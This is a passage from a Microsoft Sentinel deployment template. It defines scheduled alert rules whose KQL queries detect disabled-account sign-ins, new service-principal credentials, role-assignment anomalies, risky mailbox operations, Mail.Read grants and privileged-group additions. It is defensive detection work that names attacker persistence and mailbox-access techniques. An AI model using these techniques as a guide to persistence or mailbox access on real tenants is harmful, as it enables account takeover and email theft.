IPAddress, Type\n| order by totalDisabledAccountLoginAttempts desc) on IPAddress\n| project StartTime, EndTime, IPAddress, totalDisabledAccountLoginAttempts, disabledAccountsTargettedCount, disabledAccountSet, disabledApplicationSet, successfulApplicationSet, successfulAccountsTargettedCount, successfulAccountSigninSet, Type\n| order by totalDisabledAccountLoginAttempts};\nlet aadSignin = aadFunc(\"SigninLogs\");\nlet aadNonInt = aadFunc(\"AADNonInteractiveUserSignInLogs\");\nunion isfuzzy=true aadSignin, aadNonInt\n| join kind=leftouter (\n    BehaviorAnalytics\n    | where ActivityType in (\"FailedLogOn\", \"LogOn\")\n    | where EventSource =~ \"Azure AD\"\n    | project UsersInsights, DevicesInsights, ActivityInsights, InvestigationPriority, SourceIPAddress, UserPrincipalName\n    | project-rename IPAddress = SourceIPAddress\n    | summarize\n        Users = make_set(UserPrincipalName, 100),\n        UsersInsights = make_set(UsersInsights, 100),\n        DevicesInsights = make_set(DevicesInsights, 100),\n        IPInvestigationPriority = sum(InvestigationPriority)\n    by IPAddress\n) on IPAddress\n| extend SFRatio = toreal(toreal(disabledAccountsTargettedCount)/toreal(successfulAccountsTargettedCount))\n| where SFRatio >= 0.5\n| sort by IPInvestigationPriority desc\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "Persistence"
          ],
          "techniques": [
            "T1078",
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "500c103a-0319-4d56-8e99-3cec8d860757",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "2.1.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/8adeae8c-a28a-4895-bc38-5d657d3bc896')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/8adeae8c-a28a-4895-bc38-5d657d3bc896')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "First access credential added to Application or Service Principal where no credential was present",
          "description": "This will alert when an admin or app owner account adds a new credential to an Application or Service Principal where there was no previous verify KeyCredential associated.\nIf a threat actor obtains access to an account with sufficient privileges and adds the alternate authentication material triggering this event, the threat actor can now authenticate as the Application or Service Principal using this credential.\nAdditional information on OAuth Credential Grants can be found in RFC 6749 Section 4.4 or https://docs.microsoft.com/azure/active-directory/develop/v2-oauth2-client-creds-grant-flow\nFor further information on AuditLogs please see https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-audit-activities.",
          "severity": "High",
          "enabled": true,
          "query": "AuditLogs\n| where OperationName has (\"Certificates and secrets management\")\n| where Result =~ \"success\"\n| where tostring(InitiatedBy.user.userPrincipalName) has \"@\" or tostring(InitiatedBy.app.displayName) has \"@\"\n| mv-apply TargetResource = TargetResources on \n  (\n      where TargetResource.type =~ \"Application\"\n      | extend targetDisplayName = tostring(TargetResource.displayName),\n               targetId = tostring(TargetResource.id),\n               targetType = tostring(TargetResource.type),\n               keyEvents = TargetResource.modifiedProperties\n  )\n| mv-apply Property = keyEvents on \n  (\n      where Property.displayName =~ \"KeyDescription\"\n      | extend new_value_set = parse_json(tostring(Property.newValue)),\n               old_value_set = parse_json(tostring(Property.oldValue))\n  )\n| where old_value_set == \"[]\"\n| mv-expand new_value_set\n| parse new_value_set with * \"KeyIdentifier=\" keyIdentifier:string \",KeyType=\" keyType:string \",KeyUsage=\" keyUsage:string \",DisplayName=\" keyDisplayName:string \"]\" *\n| where keyUsage =~ \"Verify\"\n| mv-apply AdditionalDetail = AdditionalDetails on \n  (\n      where AdditionalDetail.key =~ \"User-Agent\"\n      | extend InitiatingUserAgent = tostring(AdditionalDetail.value)\n  )\n| project-away new_value_set, old_value_set, TargetResource, Property, AdditionalDetail\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n| project-reorder TimeGenerated, OperationName, InitiatingUserPrincipalName, InitiatingAadUserId, InitiatingAppName, InitiatingAppServicePrincipalId, InitiatingIpAddress, InitiatingUserAgent, \ntargetDisplayName, targetId, targetType, keyDisplayName, keyType, keyUsage, keyIdentifier, CorrelationId, TenantId\n| extend Name = split(InitiatingUserPrincipalName, \"@\")[0], UPNSuffix = split(InitiatingUserPrincipalName, \"@\")[1]\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1550"
          ],
          "subTechniques": [
            "T1550.001"
          ],
          "alertRuleTemplateName": "2cfc3c6e-f424-4b88-9cc9-c89f482d016a",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "InitiatingUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAadUserId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAppServicePrincipalId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "InitiatingIpAddress"
                }
              ]
            },
            {
              "entityType": "CloudApplication",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "targetDisplayName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.5"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/553b521b-c9f9-4df6-9a14-50a3727d7a85')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/553b521b-c9f9-4df6-9a14-50a3727d7a85')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "User Accounts - Sign in Failure due to CA Spikes",
          "description": " Identifies spike in failed sign-ins from user accounts due to conditional access policied.\nSpike is determined based on Time series anomaly which will look at historical baseline values.\nRef : https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-user-accounts#monitoring-for-failed-unusual-sign-ins\nThis query has also been updated to include UEBA logs IdentityInfo and BehaviorAnalytics for contextual information around the results.",
          "severity": "Medium",
          "enabled": true,
          "query": "let riskScoreCutoff = 20; //Adjust this based on volume of results\nlet starttime = 14d;\nlet timeframe = 1d;\nlet scorethreshold = 3;\nlet baselinethreshold = 50;\nlet aadFunc = (tableName:string){\n  // Failed Signins attempts with reasoning related to conditional access policies.\n  table(tableName)\n  | where TimeGenerated between (startofday(ago(starttime))..startofday(now()))\n  | where ResultDescription has_any (\"conditional access\", \"CA\") or ResultType in (50005, 50131, 53000, 53001, 53002, 52003, 70044)\n  | extend UserPrincipalName = tolower(UserPrincipalName)\n  | extend timestamp = TimeGenerated, AccountCustomEntity = UserPrincipalName\n};\nlet aadSignin = aadFunc(\"SigninLogs\");\nlet aadNonInt = aadFunc(\"AADNonInteractiveUserSignInLogs\");\nlet allSignins = union isfuzzy=true aadSignin, aadNonInt;\nlet TimeSeriesAlerts = \nallSignins\n| make-series DailyCount=count() on TimeGenerated from startofday(ago(starttime)) to startofday(now()) step 1d by UserPrincipalName\n| extend (anomalies, score, baseline) = series_decompose_anomalies(DailyCount, scorethreshold, -1, 'linefit')\n| mv-expand DailyCount to typeof(double), TimeGenerated to typeof(datetime), anomalies to typeof(double), score to typeof(double), baseline to typeof(long)\n// Filtering low count events per baselinethreshold\n| where anomalies > 0 and baseline > baselinethreshold\n| extend AnomalyHour = TimeGenerated\n| project UserPrincipalName, AnomalyHour, TimeGenerated, DailyCount, baseline, anomalies, score;\n// Filter the alerts for specified timeframe\nTimeSeriesAlerts\n| where TimeGenerated > startofday(ago(timeframe))\n| join kind=inner ( \n  allSignins\n  | where TimeGenerated > startofday(ago(timeframe))\n  // create a new column and round to hour\n  | extend DateHour = bin(TimeGenerated, 1h)\n  | summarize PartialFailedSignins = count(), LatestAnomalyTime = arg_max(TimeGenerated, *) by bin(TimeGenerated, 1h), OperationName, Category, ResultType, ResultDescription, UserPrincipalName, UserDisplayName, AppDisplayName, ClientAppUsed, IPAddress, ResourceDisplayName\n) on UserPrincipalName, $left.AnomalyHour == $right.DateHour\n| project LatestAnomalyTime, OperationName, Category, UserPrincipalName, UserDisplayName, ResultType, ResultDescription, AppDisplayName, ClientAppUsed, UserAgent, IPAddress, Location, AuthenticationRequirement, ConditionalAccessStatus, ResourceDisplayName, PartialFailedSignins, TotalFailedSignins = DailyCount, baseline, anomalies, score\n| extend timestamp = LatestAnomalyTime, Name = tostring(split(UserPrincipalName,'@',0)[0]), UPNSuffix = tostring(split(UserPrincipalName,'@',1)[0])\n| extend UserPrincipalName = tolower(UserPrincipalName)\n| join kind=leftouter (\n    IdentityInfo\n    | summarize LatestReportTime = arg_max(TimeGenerated, *) by AccountUPN\n    | project AccountUPN, Tags, JobTitle, GroupMembership, AssignedRoles, UserType, IsAccountEnabled\n    | summarize\n        Tags = make_set(Tags, 1000),\n        GroupMembership = make_set(GroupMembership, 1000),\n        AssignedRoles = make_set(AssignedRoles, 1000),\n        UserType = make_set(UserType, 1000),\n        UserAccountControl = make_set(UserType, 1000)\n    by AccountUPN\n    | extend UserPrincipalName=tolower(AccountUPN)\n) on UserPrincipalName\n| join kind=leftouter (\n    BehaviorAnalytics\n    | where ActivityType in (\"FailedLogOn\", \"LogOn\")\n    | where isnotempty(SourceIPAddress)\n    | project UsersInsights, DevicesInsights, ActivityInsights, InvestigationPriority, SourceIPAddress\n    | project-rename IPAddress = SourceIPAddress\n    | summarize\n        UsersInsights = make_set(UsersInsights, 1000),\n        DevicesInsights = make_set(DevicesInsights, 1000),\n        IPInvestigationPriority = sum(InvestigationPriority)\n    by IPAddress)\non IPAddress\n| extend UEBARiskScore = IPInvestigationPriority\n| where UEBARiskScore > riskScoreCutoff\n| sort by UEBARiskScore desc \n",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [
            "T1078.004"
          ],
          "alertRuleTemplateName": "3a9d5ede-2b9d-43a2-acc4-d272321ff77c",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "2.0.5"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/083f6dc5-cf8b-438b-894f-bf17b43c7cef')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/083f6dc5-cf8b-438b-894f-bf17b43c7cef')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Suspicious granting of permissions to an account",
          "description": "Identifies IPs from which users grant access to other users on Azure resources and alerts when a previously unseen source IP address is used.",
          "severity": "Medium",
          "enabled": true,
          "query": "let starttime = 14d;\nlet endtime = 1d;\n// The number of operations above which an IP address is considered an unusual source of role assignment operations\nlet alertOperationThreshold = 5;\nlet AzureBuiltInRole = externaldata(Role:string,RoleDescription:string,ID:string) [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/AzureBuiltInRole.csv\"] with (format=\"csv\", ignoreFirstRecord=True);\nlet createRoleAssignmentActivity = AzureActivity\n| where OperationNameValue =~ \"microsoft.authorization/roleassignments/write\";\nlet RoleAssignedActivity = createRoleAssignmentActivity \n| where TimeGenerated between (ago(starttime) .. ago(endtime))\n| summarize count() by CallerIpAddress, Caller, bin(TimeGenerated, 1d)\n| where count_ >= alertOperationThreshold\n// Returns all the records from the right side that don't have matches from the left.\n| join kind = rightanti ( \ncreateRoleAssignmentActivity\n| where TimeGenerated > ago(endtime)\n| extend parsed_property = tostring(parse_json(Properties).requestbody)\n| extend PrincipalId = case(parsed_property has_cs 'PrincipalId',parse_json(parsed_property).Properties.PrincipalId, parsed_property has_cs 'principalId',parse_json(parsed_property).properties.principalId,\"\")\n| extend PrincipalType = case(parsed_property has_cs 'PrincipalType',parse_json(parsed_property).Properties.PrincipalType, parsed_property has_cs 'principalType',parse_json(parsed_property).properties.principalType, \"\")\n| extend Scope = case(parsed_property has_cs 'Scope',parse_json(parsed_property).Properties.Scope, parsed_property has_cs 'scope',parse_json(parsed_property).properties.scope,\"\")\n| extend RoleAddedDetails = case(parsed_property has_cs 'RoleDefinitionId',parse_json(parsed_property).Properties.RoleDefinitionId,parsed_property has_cs 'roleDefinitionId',parse_json(parsed_property).properties.roleDefinitionId,\"\")\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), ActivityTimeStamp = make_set(TimeGenerated), ActivityStatusValue = make_set(ActivityStatusValue), CorrelationId = make_set(CorrelationId), ActivityCountByCallerIPAddress = count()  \nby ResourceId, CallerIpAddress, Caller, OperationNameValue, Resource, ResourceGroup, PrincipalId, PrincipalType, Scope, RoleAddedDetails\n) on CallerIpAddress, Caller\n| extend timestamp = StartTimeUtc, AccountCustomEntity = Caller, IPCustomEntity = CallerIpAddress;\nlet RoleAssignedActivitywithRoleDetails = RoleAssignedActivity\n| extend RoleAssignedID = tostring(split(RoleAddedDetails, \"/\")[-1])\n// Returns all matching records from left and right sides.\n| join kind = inner (AzureBuiltInRole \n) on $left.RoleAssignedID == $right.ID;\nlet CallerIPCountSummary = RoleAssignedActivitywithRoleDetails | summarize AssignmentCountbyCaller = count() by Caller, CallerIpAddress;\nlet RoleAssignedActivityWithCount = RoleAssignedActivitywithRoleDetails | join kind = inner (CallerIPCountSummary | project Caller, AssignmentCountbyCaller, CallerIpAddress) on Caller, CallerIpAddress;\nRoleAssignedActivityWithCount\n| summarize arg_max(StartTimeUtc, *) by PrincipalId, RoleAssignedID\n// \tReturns all the records from the left side and only matching records from the right side.\n| join kind = leftouter( IdentityInfo\n| summarize arg_max(TimeGenerated, *) by AccountObjectId\n) on $left.PrincipalId == $right.AccountObjectId\n// Check if assignment count is greater than the threshold.\n| where AssignmentCountbyCaller >= alertOperationThreshold\n| project ActivityTimeStamp, OperationNameValue, Caller, CallerIpAddress, PrincipalId, RoleAssignedID, RoleAddedDetails, Role, RoleDescription, AccountUPN, AccountCreationTime, GroupMembership, UserType, ActivityStatusValue, ResourceGroup, PrincipalType, Scope, CorrelationId, timestamp, AccountCustomEntity, IPCustomEntity, AssignmentCountbyCaller\n| extend Name = tostring(split(Caller,'@',0)[0]), UPNSuffix = tostring(split(Caller,'@',1)[0])\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1098",
            "T1548"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "b2c15736-b9eb-4dae-8b02-3016b6a45a32",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Caller"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "CallerIpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "2.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/dcc5a28b-a62a-476d-a066-364dda428597')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/dcc5a28b-a62a-476d-a066-364dda428597')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Rare and potentially high-risk Office operations",
          "description": "Identifies Office operations that are typically rare and can provide capabilities useful to attackers.",
          "severity": "Low",
          "enabled": true,
          "query": "OfficeActivity\n| where Operation in~ ( \"Add-MailboxPermission\", \"Add-MailboxFolderPermission\", \"Set-Mailbox\", \"New-ManagementRoleAssignment\", \"New-InboxRule\", \"Set-InboxRule\", \"Set-TransportRule\")\nand not(UserId has_any ('NT AUTHORITY\\\\SYSTEM (Microsoft.Exchange.ServiceHost)', 'NT AUTHORITY\\\\SYSTEM (Microsoft.Exchange.AdminApi.NetCore)', 'NT AUTHORITY\\\\SYSTEM (w3wp)', 'devilfish-applicationaccount') and Operation in~ ( \"Add-MailboxPermission\", \"Set-Mailbox\"))\n| extend ClientIPOnly = tostring(extract_all(@'\\[?(::ffff:)?(?P<IPAddress>(\\d+\\.\\d+\\.\\d+\\.\\d+)|[^\\]]+)\\]?', dynamic([\"IPAddress\"]), ClientIP)[0])\n| extend AccountName = tostring(split(UserId, \"@\")[0]), AccountUPNSuffix = tostring(split(UserId, \"@\")[1])\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "Collection"
          ],
          "techniques": [
            "T1098",
            "T1114"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "957cb240-f45d-4491-9ba5-93430a3c08be",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserId"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "AccountUPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "ClientIP"
                }
              ]
            },
            {
              "entityType": "CloudApplication",
              "fieldMappings": [
                {
                  "identifier": "AppId",
                  "columnName": "AppId"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "2.0.5"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/ebcbb8da-67cb-41e9-bef5-b8383a7bc67c')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/ebcbb8da-67cb-41e9-bef5-b8383a7bc67c')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Mail.Read Permissions Granted to Application",
          "description": "This query look for applications that have been granted (Delegated or App/Role) permissions to Read Mail (Permissions field has Mail.Read) and subsequently has been consented to. This can help identify applications that have been abused to gain access to mailboxes.",
          "severity": "Medium",
          "enabled": true,
          "query": "AuditLogs\n| where Category =~ \"ApplicationManagement\"\n| where ActivityDisplayName has_any (\"Add delegated permission grant\",\"Add app role assignment to service principal\")  \n| where Result =~ \"success\"\n| where tostring(InitiatedBy.user.userPrincipalName) has \"@\" or tostring(InitiatedBy.app.displayName) has \"@\"\n| mv-apply TargetResource = TargetResources on \n  (\n      where TargetResource.type =~ \"ServicePrincipal\" and array_length(TargetResource.modifiedProperties) > 0 and isnotnull(TargetResource.displayName)\n      | extend props = TargetResource.modifiedProperties,\n               Type = tostring(TargetResource.type),\n               PermissionsAddedTo = tostring(TargetResource.displayName)\n  )\n| mv-apply Property = props on \n  (\n      where Property.displayName =~ \"DelegatedPermissionGrant.Scope\"\n      | extend DisplayName = tostring(Property.displayName), Permissions = trim('\"',tostring(Property.newValue))\n  )\n| where Permissions has_any (\"Mail.Read\", \"Mail.ReadWrite\")\n| mv-apply AdditionalDetail = AdditionalDetails on \n  (\n      where AdditionalDetail.key =~ \"User-Agent\"\n      | extend InitiatingUserAgent = tostring(AdditionalDetail.value)\n  )\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n| project-away props, TargetResource, AdditionalDetail, Property\n| join kind=leftouter(\n  AuditLogs\n  | where ActivityDisplayName has \"Consent to application\"\n  | mv-apply TargetResource = TargetResources on \n      (\n          where TargetResource.type =~ \"ServicePrincipal\"\n          | extend AppName = tostring(TargetResource.displayName),\n                   AppId = tostring(TargetResource.id)\n      )\n| project AppName, AppId, CorrelationId) on CorrelationId\n| project-away CorrelationId1\n| project-reorder TimeGenerated, OperationName, InitiatingUserPrincipalName, InitiatingAadUserId, InitiatingAppName, InitiatingAppServicePrincipalId, InitiatingIpAddress, InitiatingUserAgent, PermissionsAddedTo, Permissions, AppName, AppId, CorrelationId\n| extend Name = tostring(split(InitiatingUserPrincipalName,'@',0)[0]), UPNSuffix = tostring(split(InitiatingUserPrincipalName,'@',1)[0])\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "2560515c-07d1-434e-87fb-ebe3af267760",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "InitiatingUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAadUserId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAppServicePrincipalId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "InitiatingIpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/4fb8d501-34a3-4c3a-bd9f-c0c6f326b46c')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/4fb8d501-34a3-4c3a-bd9f-c0c6f326b46c')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "User added to Microsoft Entra ID Privileged Groups",
          "description": "This will alert when a user is added to any of the Privileged Groups.\nFor further information on AuditLogs please see https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-audit-activities.\nFor Administrator role permissions in Microsoft Entra ID please see https://docs.microsoft.com/azure/active-directory/users-groups-roles/directory-assign-admin-roles",
          "severity": "Medium",
          "enabled": true,
          "query": "let OperationList = dynamic([\"Add member to role\",\"Add member to role in PIM requested (permanent)\"]);\nlet PrivilegedGroups = dynamic([\"UserAccountAdmins\",\"PrivilegedRoleAdmins\",\"TenantAdmins\"]);\nAuditLogs\n//| where LoggedByService =~ \"Core Directory\"\n| where Category =~ \"RoleManagement\"\n| where OperationName in~ (OperationList)\n| mv-apply TargetResource = TargetResources on \n  (\n      where TargetResource.type =~ \"User\"\n      | extend TargetUserPrincipalName = tostring(TargetResource.userPrincipalName),\n               modProps = TargetResource.modifiedProperties\n  )\n| mv-apply Property = modProps on \n  (\n      where Property.displayName =~ \"Role.WellKnownObjectName\"\n      | extend DisplayName = trim('\"',tostring(Property.displayName)),\n               GroupName = trim('\"',tostring(Property.newValue))\n  )\n| extend InitiatingAppId = InitiatedBy.app.appId\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingAppServicePrincipalName = tostring(InitiatedBy.app.servicePrincipalName)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n| extend InitiatingUserRoles = InitiatedBy.user.roles\n| where GroupName in~ (PrivilegedGroups)\n// If you don't want to alert for operations from PIM, remove below filtering for MS-PIM.\n//| where InitiatingAppName != \"MS-PIM\"\n| project TimeGenerated, AADOperationType, Category, OperationName, AADTenantId, InitiatingUserPrincipalName, InitiatingAadUserId, InitiatingAppId, InitiatingAppName, InitiatingAppServicePrincipalName, InitiatingAppServicePrincipalId, InitiatingIpAddress, DisplayName, GroupName, InitiatingUserRoles, TargetUserPrincipalName\n| extend AccountName = tostring(split(InitiatingUserPrincipalName,'@',0)[0]), AccountUPNSuffix = tostring(split(InitiatingUserPrincipalName,'@',1)[0])\n| extend TargetName = tostring(split(TargetUserPrincipalName,'@',0)[0]), TargetUPNSuffix = tostring(split(TargetUserPrincipalName,'@',1)[0])\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
